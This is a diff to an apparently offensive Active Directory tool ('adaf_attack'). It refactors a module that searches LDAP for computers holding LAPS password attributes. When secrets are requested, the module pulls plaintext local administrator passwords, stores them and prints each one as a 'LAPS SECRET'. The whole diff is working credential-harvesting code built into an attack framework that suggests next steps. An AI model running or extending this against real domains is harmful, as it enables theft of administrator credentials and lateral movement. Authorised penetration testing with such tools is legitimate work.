@@ -12,7 +12,7 @@ from rich.console import Console
 
 from adaf_attack.core.acl import fetch_sd, parse_interesting_aces
 from adaf_attack.core.graph import AttackGraph
-from adaf_attack.core.ldap_util import ldap_connect
+from adaf_attack.core.ldap_util import ldap_connect, schema_supported_attributes
 from adaf_attack.core.registry import register_capability
 from adaf_attack.core.session import Session
 from adaf_attack.core.target import Target
@@ -32,15 +32,25 @@ GMSA_ATTRS = [
     "userAccountControl",
 ]
 
-LAPS_ATTRS = [
-    "sAMAccountName",
-    "distinguishedName",
+LAPS_CORE_ATTRS = ["sAMAccountName", "distinguishedName"]
+LAPS_SCHEMA_ATTRS = [
     "ms-Mcs-AdmPwd",
     "ms-Mcs-AdmPwdExpirationTime",
     "msLAPS-Password",
     "msLAPS-PasswordExpirationTime",
     "msLAPS-EncryptedPassword",
 ]
+LAPS_PASSWORD_ATTRS = ["ms-Mcs-AdmPwd", "msLAPS-Password", "msLAPS-EncryptedPassword"]
+LAPS_ATTRS = [*LAPS_CORE_ATTRS, *LAPS_SCHEMA_ATTRS]
+
+
+def _entry_attr(entry: Any, name: str | None) -> Any | None:
+    if not name:
+        return None
+    try:
+        return entry[name]
+    except (AttributeError, KeyError, TypeError):
+        return getattr(entry, name, None)
 
 
 def _parse_managed_password_blob(blob: bytes) -> dict[str, Any] | None:
@@ -186,19 +196,38 @@ class GmsaLapsEnum:
 
         # LAPS
         laps_computers: list[dict[str, Any]] = []
-        conn.search(
-            base_dn,
-            "(&(objectCategory=computer)(|(ms-Mcs-AdmPwd=*)(msLAPS-Password=*)(msLAPS-EncryptedPassword=*)))",
-            search_scope=SUBTREE,
-            attributes=LAPS_ATTRS,
-        )
-        for entry in conn.entries:
+        supported_laps, skipped_laps = schema_supported_attributes(conn, LAPS_SCHEMA_ATTRS)
+        laps_by_name = {name.casefold(): name for name in supported_laps}
+        password_attrs = [
+            laps_by_name[name.casefold()]
+            for name in LAPS_PASSWORD_ATTRS
+            if name.casefold() in laps_by_name
+        ]
+        if password_attrs:
+            presence_filter = "".join(f"({name}=*)" for name in password_attrs)
+            conn.search(
+                base_dn,
+                f"(&(objectCategory=computer)(|{presence_filter}))",
+                search_scope=SUBTREE,
+                attributes=[*LAPS_CORE_ATTRS, *supported_laps],
+            )
+            laps_entries = list(conn.entries)
+        else:
+            laps_entries = []
+
+        legacy_name = laps_by_name.get("ms-mcs-admpwd")
+        windows_name = laps_by_name.get("mslaps-password")
+        encrypted_name = laps_by_name.get("mslaps-encryptedpassword")
+        for entry in laps_entries:
             sam = str(entry.sAMAccountName) if entry.sAMAccountName else None
             if not sam:
                 continue
             dn = str(entry.distinguishedName)
-            legacy = bool(entry["ms-Mcs-AdmPwd"]) if entry["ms-Mcs-AdmPwd"] else False
-            win_laps = bool(entry["msLAPS-Password"] or entry["msLAPS-EncryptedPassword"])
+            legacy_attr = _entry_attr(entry, legacy_name)
+            windows_attr = _entry_attr(entry, windows_name)
+            encrypted_attr = _entry_attr(entry, encrypted_name)
+            legacy = bool(legacy_attr)
+            win_laps = bool(windows_attr or encrypted_attr)
             item = {
                 "sam": sam,
                 "dn": dn,
@@ -207,16 +236,16 @@ class GmsaLapsEnum:
             }
 
             if include_secrets:
-                if entry["ms-Mcs-AdmPwd"] and entry["ms-Mcs-AdmPwd"].value:
-                    item["ms_mcs_admpwd"] = str(entry["ms-Mcs-AdmPwd"].value)
+                if legacy_attr and legacy_attr.value:
+                    item["ms_mcs_admpwd"] = str(legacy_attr.value)
                     secrets_found += 1
                     console.print(f"  [red]LAPS SECRET[/red]  {sam} (legacy)")
-                if entry["msLAPS-Password"] and entry["msLAPS-Password"].value:
-                    item["mslaps_password"] = str(entry["msLAPS-Password"].value)
+                if windows_attr and windows_attr.value:
+                    item["mslaps_password"] = str(windows_attr.value)
                     secrets_found += 1
                     console.print(f"  [red]LAPS SECRET[/red]  {sam} (windows)")
-                if entry["msLAPS-EncryptedPassword"] and entry["msLAPS-EncryptedPassword"].value:
-                    val = entry["msLAPS-EncryptedPassword"].value
+                if encrypted_attr and encrypted_attr.value:
+                    val = encrypted_attr.value
                     item["mslaps_encrypted_present"] = True
                     item["mslaps_encrypted_len"] = len(val) if hasattr(val, "__len__") else None
 
@@ -263,6 +292,10 @@ class GmsaLapsEnum:
             "gmsas": gmsas,
             "laps_computer_count": len(laps_computers),
             "laps_computers": laps_computers,
+            "laps_schema": {
+                "queried_attributes": supported_laps,
+                "skipped_attributes": skipped_laps,
+            },
             "secrets_returned": secrets_found if include_secrets else 0,
             "include_secrets": include_secrets,
             "suggested_next": next_actions_hints[:10],
